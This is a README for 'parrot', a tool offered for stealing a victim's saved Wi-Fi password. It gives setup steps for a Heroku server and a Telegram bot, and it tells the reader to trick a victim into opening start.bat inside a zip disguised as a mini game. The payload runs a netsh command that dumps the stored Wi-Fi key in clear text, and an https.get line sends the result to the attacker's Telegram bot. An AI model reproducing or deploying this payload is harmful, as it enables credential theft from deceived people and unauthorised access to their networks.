# parrot Wi-Fi hacking tool
this is a simple payload that sends the password of a known wifi  to rouge sever.
# requirements
node.js https://nodejs.org/en/download/  
heroku account https://signup.heroku.com/  
heroku cli https://devcenter.heroku.com/articles/heroku-cli#download-and-install  
A telegram bot https://t.me/BotFather
# usage
```shell
git clone https://github.com/ba5liel/parrot.git  
cd parrot  
heroku login  
git push -u heroku 
```
Insert the aproprate params
```js
https.get(`https://api.telegram.org/bot{{Your bot token}}/sendMessage?chat_id={{your telegram id}}&text=${body}`);
```
send the Game-monkey-lander.zip to victim using any social engineering techniques. and make sure the victim opens the start.bat file  
now you can see the password at [yourapp].heroku.com or it's sent to your telegram account through the bot you setted up using @BotFather
# payload
this include a mini game that launches when start.bat is opened.  
you must change the start.bat in the payload    

```shell
netsh wlan show profile "vitim wifi name" key=clear | findstr "Key Content" > bin\log.txt
```

#enjoy
